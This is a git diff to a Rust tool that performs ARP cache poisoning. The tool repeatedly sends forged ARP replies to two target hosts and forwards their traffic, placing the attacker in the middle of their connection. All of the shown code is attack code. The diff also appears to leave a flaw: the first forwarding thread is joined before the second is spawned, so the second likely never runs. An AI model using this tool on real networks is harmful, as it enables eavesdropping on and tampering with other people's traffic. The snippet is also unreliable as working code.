@@ -3,7 +3,7 @@ mod ui;
 use ansi_term::{Color, Style};
 use smoltcp::phy::RawSocket;
 use net::*;
-use net::arp::*;
+use net::arp_packet::ArpPacket;
 use std::env::args;
 use std::net::Ipv4Addr;
 use std::str::FromStr;
@@ -12,24 +12,24 @@ use mac_addr::MacAddr;
 
 fn get_mac(target_ip: Ipv4Addr) -> MacAddr {
     let mut socket = RawSocket::new(&args().nth(1).unwrap()).unwrap();
-    request::send(&mut socket, &target_ip.octets());
+    ArpPacket::send_request(&mut socket, &target_ip);
 
-    request::get_target_mac(&mut socket, &target_ip)
+    arp_packet::get_target_mac(&mut socket, &target_ip)
 }
 
 fn arp_cache_poisoning(target_a_ip: Ipv4Addr, target_b_ip: Ipv4Addr, target_a_mac: MacAddr, target_b_mac: MacAddr) {
     let mut socket = RawSocket::new(&args().nth(1).unwrap()).unwrap();
     println!("{}", Color::Red.bold().paint("starting the ARP cache poisoning "));
     loop {
-        reply::send(&mut socket, &target_a_ip.octets(), &target_a_mac.octets(), &target_b_ip.octets());
-        reply::send(&mut socket, &target_b_ip.octets(), &target_b_mac.octets(), &target_a_ip.octets());
+        ArpPacket::send_reply(&mut socket, &target_a_mac, &target_a_ip, &target_b_ip);
+        ArpPacket::send_reply(&mut socket, &target_b_mac, &target_b_ip, &target_a_ip);
         thread::sleep(time::Duration::from_secs(5));
     }
 }
 
-fn forward(target_a_mac: MacAddr, target_b_mac: MacAddr) {
+fn forward(target_mac: MacAddr) {
     let mut socket = RawSocket::new(&args().nth(1).unwrap()).unwrap();
-    forwarding::listen(&mut socket, &target_a_mac.octets(), &target_b_mac.octets());
+    forwarding::listen(&mut socket, target_mac);
 }
 
 fn main() {
@@ -58,7 +58,8 @@ fn main() {
 
             thread::spawn(move || arp_cache_poisoning(target_a_ip, target_b_ip, target_a_mac, target_b_mac));
 
-            thread::spawn(move || forward(target_a_mac, target_b_mac)).join().unwrap();
+            thread::spawn(move || forward(target_a_mac)).join().unwrap();
+            thread::spawn(move || forward(target_b_mac)).join().unwrap();
         } else {
             for ip in invalid_ips {
                 eprintln!("{} invalid IP address => {}", Color::Red.bold().paint("error:"), Style::new().bold().paint(ip));
